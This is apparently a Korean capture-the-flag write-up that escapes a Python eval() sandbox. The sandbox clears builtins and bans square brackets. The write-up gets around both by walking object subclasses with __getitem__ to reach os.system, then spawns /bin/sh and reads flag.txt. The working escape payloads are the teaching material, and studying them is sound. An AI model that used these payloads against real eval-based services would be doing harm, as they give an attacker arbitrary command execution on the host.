# 문제 풀이
## 1. 문제 분석
문제 재목인 sandbox와 탈옥하라는 시나리오를 봐서는, 격리된 샌드박스를 탈출하라는 문제인것 같다.  
파이썬으로 만들어진 프로세서라는 샌드박스를 깨고 나와 쉘을 탈취해보자.  

## 2. 문제 해결
### 2.1. 샌드박스 분석
샌드박스를 분석해보면, 파이썬으로 만들어진 프로세서이고, input() 함수를 이용해 입력을 받은 후 eval() 함수를 이용해 입력을 실행한다.
```python
bEval = eval
bPrint = print
input = input(">>> ")
if '[' in input or ']' in input:
    print('[ 당신은 탈옥하는데 실패했습니다 :( ]')
    exit(-1)
globals()['__builtins__'].__dict__.clear()
bPrint(bEval(input, {}, {}))
```
입력값에 [와 ]가 들어가면 탈옥에 실패했다고 출력하고 프로그램을 종료한다.

### 2.2. 샌드박스 탈출
이 문제는 파이썬의 내장함수인 eval() 함수를 이용해 탈출할 수 있다.
eval() 함수는 문자열을 파이썬 코드로 실행시키는 함수이다.
```python
>>> eval('1+1')
2
```
위와 같이 eval() 함수를 이용해 문자열을 파이썬 코드로 실행시킬 수 있다.
이를 이용해 샌드박스를 탈출해보자.

#### 2.2.1. 탈출 방법
eval() 함수를 이용해 문자열을 파이썬 코드로 실행시킬 수 있으므로, Instantiation, Classes 이 두가지 개념만 알고 있다면 쉽게 탈출할 수 있다.  
Instantiation은 클래스를 인스턴스화 하는 것이고, Classes는 클래스를 만드는 것이다.
```python
>>> class A:
...     pass
...
>>> a = A()
>>> a
<__main__.A object at 0x7f9b8c0b9a90>
```
위와 같이 클래스를 만들고 인스턴스화 할 수 있다.
이때 파이썬에서는 기본적으로 상속받는 내용이 있는데, 이를 이용해 탈출할 수 있다.
이를 Python JailBreak라고 한다.

#### 2.2.2. 탈출 과정
아래의 코드로 최상단의 object에 접근을 하여 사용할 수 있는 subClass를 확인할 수 있다.
```python
{}.__class__.__base__.__subclasses__()
```
또한 이 코드를 이용해 사용가능한 method와 attribute 확인이 가능하다.
```python
{}.__class__.__base__.__subclasses__().__dir__()
```
보통의 경우라면 [와 ]를 이용해 __subclasses__()의 특정 요소에 접근할 수 있지만 지금은 대신 `__getitem__()`를 사용하여 접근한다.  
접근할 타깃은 `<class 'os._wrap_close'>` 이고 처음 실행결과를 분석해보면 137번째에 위치해 있다.  
![](/images/Screenshot%202022-09-12%20032421.png)
위의 `<class 'os._wrap_close'>`의 메소드 중 `get()`을 이용해 `system` 모듈을 호출할 수 있다.
```python
{}.__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__.get('system')
```
또한 다음과 같이 쉘을 실행할 수 있다.
```python
{}.__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__.get('system')('/bin/sh')
```
또는 flag.txt 파일을 예상에 다음과 같이 바로 플래그를 출력할 수도 있다.  
```python
{}.__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__.get('system')('cat flag.txt')
```

이제 플래그가 출력된다.  

![](/images/Screenshot%202022-09-12%20033111.png)
